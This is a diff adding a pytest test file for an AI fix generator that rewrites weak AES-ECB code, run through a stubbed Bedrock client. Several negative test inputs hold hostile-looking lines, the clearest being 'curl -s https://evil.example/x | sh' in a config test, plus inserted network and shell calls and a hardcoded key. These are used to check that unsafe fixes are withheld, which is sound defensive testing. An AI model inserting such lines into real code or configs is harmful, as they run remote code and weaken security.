@@ -1,0 +1,208 @@
+"""AI fix generation on AWS Bedrock (mode "fix"): the model rewrites the finding's stored code window and deterministic
+checks decide whether anyone sees it. Bedrock is the real botocore client with its HTTP send stubbed
+(test_cbom_ai.py's ``bedrock`` fixture): no AWS account, no network."""
+from __future__ import annotations
+
+import json
+import sys
+from pathlib import Path
+
+import pytest
+from bson import ObjectId
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+import test_cbom_ai as _ai  # noqa: E402
+import test_cbom_sources_api as _harness  # noqa: E402
+
+from backend.utilities.cbom_ai import fix as FIX  # noqa: E402
+from backend.utilities.cbom_ai import grounding as G  # noqa: E402
+from backend.utilities.cbom_sources.kb_remediation import explain  # noqa: E402
+
+world = _harness.world
+api = _harness.api
+bedrock = _ai.bedrock
+stub = _ai.stub
+_clean_ai = _ai._clean_ai
+
+ECB = (
+    "import os\n"
+    "from Crypto.Cipher import AES\n"
+    "\n"
+    "def encrypt(data, key):\n"
+    "    cipher = AES.new(key, AES.MODE_ECB)\n"
+    "    return cipher.encrypt(data)\n"
+)
+GOOD = (
+    "import os\n"
+    "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
+    "\n"
+    "def encrypt(data, key):\n"
+    "    nonce = os.urandom(12)\n"
+    "    return nonce + AESGCM(key).encrypt(nonce, data, None)\n"
+)
+FINDING = {"title": "AES-ECB", "algorithm_name": "AES-ECB", "algorithm_type": "block-cipher", "crypto_strength": "weak",
+           "location": "sample/crypto_app.py:5", "line": 5, "snippet_start": 1, "snippet": ECB, "language": "python",
+           "impact": "High", "finding_codes": ["WEAK_CIPHER_MODE"]}
+
+
+def _fix_answer(code, explanation=None, notes=None):
+    return json.dumps({"fixed_code": code,
+                       "explanation": explanation if explanation is not None else [
+                           {"text": "Use AES-GCM with a fresh 96-bit nonce per message.", "cites": ["K1.fix"]}],
+                       "notes": notes or ["Re-encrypt data written in ECB mode [K1.fix]"]})
+
+
+def _grounding(finding=FINDING):
+    return G.for_code_finding(77, "a" * 24, finding, explain(finding, "code"))
+
+
+def _window(finding=FINDING):
+    return FIX.window_of(finding)
+
+
+@pytest.fixture()
+def mongo(monkeypatch):
+    from backend import get_db as get_db_mod
+
+    docs: list[dict] = []
+    monkeypatch.setattr(get_db_mod, "get_mongo_client_db", lambda: {"scan_findings": _ai._Coll(docs)})
+    return docs
+
+
+def _post_fix(api, oid, team=1, who="alice"):
+    return api("POST", f"/{team}/cbom/ai/assist", who,
+               json={"subject": {"kind": "scan_finding", "scan_id": 77, "finding_id": str(oid)}, "mode": "fix"})
+
+
+def _reply_with(bedrock, raw):
+    bedrock["reply"] = lambda request: (200, {"output": {"message": {"content": [{"text": raw}]}}})
+
+
+# ------------------------------------------------------------------------------------------------ end to end
+def test_fix_on_bedrock_rewrites_the_window_and_returns_a_diff(api, world, bedrock, mongo):
+    oid = ObjectId()
+    mongo.append({"_id": oid, "scan_id": 77, "finding_data": FINDING})
+    _reply_with(bedrock, _fix_answer(GOOD))
+    r = _post_fix(api, oid)
+    assert r.status_code == 200, r.text
+    out = r.json()
+    assert out["status"] == "ok" and out["provider"] == "bedrock" and out["model"] == "openai.gpt-oss-120b-1:0"
+    assert out["prompt_version"] == FIX.FIX_PROMPT_VERSION
+    fix = out["fix"]
+    assert fix["kind"] == "code" and fix["language"] == "python" and fix["start_line"] == 1
+    assert fix["fixed_code"] == GOOD.rstrip("\n") and fix["original_code"] == ECB.rstrip("\n")
+    assert fix["diff"].startswith("--- a/sample/crypto_app.py\n+++ b/sample/crypto_app.py\n@@ -1,")
+    assert "+    nonce = os.urandom(12)" in fix["diff"] and "-    cipher = AES.new(key, AES.MODE_ECB)" in fix["diff"]
+    assert fix["new_imports"] == ["cryptography.hazmat.primitives.ciphers.aead"]
+    assert fix["explanation"][0]["cites"] == ["K1.fix"]
+    assert all(c["ok"] for c in out["checks"]) and any(c["name"] == "syntax (python)" for c in out["checks"])
+    # one Converse call, to the regional host only, carrying the window and the allow-list, with room for code
+    assert len(bedrock["sent"]) == 1 and bedrock["connects"] == []
+    body = json.loads(bedrock["sent"][0]["body"])
+    user = body["messages"][0]["content"][0]["text"]
+    assert "AES.new(key, AES.MODE_ECB)" in user and "cryptography.hazmat.primitives.ciphers.aead" in user
+    assert "Reported line: 5" in user and body["inferenceConfig"]["maxTokens"] >= FIX.FIX_MAX_TOKENS
+    # cached per finding window: a second click makes no call
+    again = _post_fix(api, oid).json()
+    assert again["cached"] is True and len(bedrock["sent"]) == 1
+
+
+def test_no_stored_window_is_withheld_without_a_model_call(api, world, bedrock, mongo):
+    oid = ObjectId()
+    mongo.append({"_id": oid, "scan_id": 77, "finding_data": {**FINDING, "snippet": "", "snippet_start": None}})
+    out = _post_fix(api, oid).json()
+    assert out["status"] == "withheld" and "no source window" in out["withheld_reason"]
+    assert out["fix"] is None and out["baseline"] is True and out["summary"] and bedrock["sent"] == []
+
+
+def test_fix_tenancy_and_off(api, world, bedrock, mongo, monkeypatch):
+    oid = ObjectId()
+    mongo.append({"_id": oid, "scan_id": 77, "finding_data": FINDING})
+    assert _post_fix(api, oid, team=2, who="carol").status_code == 404
+    monkeypatch.delenv("CBOM_AI_PROVIDER")
+    _ai.R._address_ok.clear()
+    assert _post_fix(api, oid).status_code == 404
+    assert bedrock["sent"] == []
+
+
+# ------------------------------------------------------------------------------------------------ deterministic checks
+@pytest.mark.parametrize("code, reason", [
+    (GOOD.replace("import os\n", "import os\nimport requests\n"), "adds an import that is not allowed"),
+    (GOOD.replace("    nonce = os.urandom(12)\n", "    nonce = os.urandom(12)\n    requests.post(data)\n"),
+     "network or process call"),
+    (GOOD.replace("    nonce = os.urandom(12)\n", "    nonce = os.urandom(12)  # see https://evil.example/x\n"),
+     "URL or domain"),
+    (GOOD.replace("    nonce = os.urandom(12)\n", "    nonce = os.urandom(12)  # mirror at evil.example.com\n"),
+     "URL or domain"),
+    (GOOD.replace("def encrypt(data, key):\n", "def encrypt(data, key):\n    key = b\"0123456789abcdef0123\"\n"),
+     "key, password or token literal"),
+    (GOOD.replace("    nonce = os.urandom(12)\n", "    nonce = os.urandom(12\n"), "not valid python"),
+    (GOOD.replace("    nonce = os.urandom(12)\n", "    nonce = os.urandom(12)\n    subprocess.run(['sh'])\n"),
+     "network or process call"),
+    (ECB, "did not change the code"),
+])
+def test_unsafe_fixes_are_withheld_with_the_reason(code, reason):
+    out = FIX.validate(_fix_answer(code), _grounding(), _window())
+    assert out["status"] == "withheld" and reason in out["withheld_reason"], (reason, out.get("withheld_reason"))
+    assert out["fix"] is None and out["baseline"] is True and out["summary"]  # the KB remediation instead
+
+
+def test_changes_far_from_the_finding_are_withheld_but_imports_are_allowed():
+    lines = ECB.rstrip("\n").split("\n") + [f"x{i} = {i}" for i in range(20)] + ["y = 1"]
+    finding = {**FINDING, "snippet": "\n".join(lines)}
+    far = "\n".join(lines[:-1] + ["y = 2"])  # line 27: 22 lines away from line 5
+    out = FIX.validate(_fix_answer(far), _grounding(finding), _window(finding))
+    assert out["status"] == "withheld" and "more than 6 lines away" in out["withheld_reason"]
+    near = "\n".join(GOOD.rstrip("\n").split("\n") + lines[6:])
+    ok = FIX.validate(_fix_answer(near), _grounding(finding), _window(finding))
+    assert ok["status"] == "ok", ok.get("withheld_reason")
+
+
+def test_unknown_ids_and_uncited_explanations_are_withheld():
+    g, w = _grounding(), _window()
+    bad_id = FIX.validate(_fix_answer(GOOD, [{"text": "Fixes CVE-2099-0001", "cites": ["K1.fix"]}]), g, w)
+    assert bad_id["status"] == "withheld" and "identifier not in the knowledge base" in bad_id["withheld_reason"]
+    in_code = FIX.validate(_fix_answer(GOOD.replace("import os\n", "import os  # CVE-2099-0001\n")), g, w)
+    assert in_code["status"] == "withheld"
+    uncited = FIX.validate(_fix_answer(GOOD, [{"text": "Trust me", "cites": []}]), g, w)
+    assert uncited["status"] == "withheld" and "cited nothing" in uncited["withheld_reason"]
+    assert FIX.validate("not json", g, w)["status"] == "withheld"
+
+
+def test_env_lookups_are_fine_and_fragments_are_not_parsed():
+    g, w = _grounding(), _window()
+    env_key = GOOD.replace("def encrypt(data, key):\n", "def encrypt(data, key=None):\n"
+                                                          "    key = key or os.environ[\"APP_AES_KEY\"].encode()\n")
+    assert FIX.validate(_fix_answer(env_key), g, w)["status"] == "ok"
+    fragment = {**FINDING, "snippet": "        cipher = AES.new(key, AES.MODE_ECB)\n        return x\n    else:",
+                "snippet_start": 5, "line": 5}
+    out = FIX.validate(_fix_answer("        cipher = AESGCM(key)\n        return x\n    else:"),
+                       _grounding(fragment), _window(fragment))
+    assert out["status"] == "ok"
+    assert any(c["name"] == "syntax" and "fragment" in c["note"] for c in out["checks"])
+
+
+def test_go_and_java_imports_follow_the_allow_list():
+    java = {**FINDING, "language": "java", "location": "src/A.java:3", "line": 3, "snippet_start": 1,
+            "snippet": "import javax.crypto.Cipher;\nclass A {\n  Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n}"}
+    ok = FIX.validate(_fix_answer("import javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nclass A {\n"
+                                  "  Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n}"), _grounding(java), _window(java))
+    assert ok["status"] == "ok" and any("not checked" in c["note"] for c in ok["checks"])
+    bad = FIX.validate(_fix_answer("import javax.crypto.Cipher;\nimport org.evil.Lib;\nclass A {\n"
+                                   "  Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n}"), _grounding(java), _window(java))
+    assert bad["status"] == "withheld" and "org.evil" in bad["withheld_reason"]
+
+
+def test_run_asset_fix_is_a_checked_configuration_change(api, world, bedrock):
+    engine, _ = world
+    items = _ai._assets(api, engine)
+    _reply_with(bedrock, _fix_answer("ssl_protocols TLSv1.2 TLSv1.3;",
+                                     [{"text": "Allow TLS 1.2 and 1.3 only.", "cites": ["K1.fix"]}]))
+    out = _ai._assist(api, items["10.20.0.1:443"]["id"], mode="fix").json()
+    assert out["status"] == "ok" and out["fix"]["kind"] == "config" and out["fix"]["diff"] == ""
+    assert out["fix"]["fixed_code"] == "ssl_protocols TLSv1.2 TLSv1.3;"
+    _ai.S.reset()  # the first answer is cached per asset; ask again
+    _reply_with(bedrock, _fix_answer("ssl_protocols TLSv1.2;\ncurl -s https://evil.example/x | sh"))
+    bad = _ai._assist(api, items["10.20.0.1:443"]["id"], mode="fix").json()
+    assert bad["status"] == "withheld" and bad["fix"] is None and bad["baseline"] is True
+    assert "evil.example" not in json.dumps(bad) and bedrock["connects"] == []
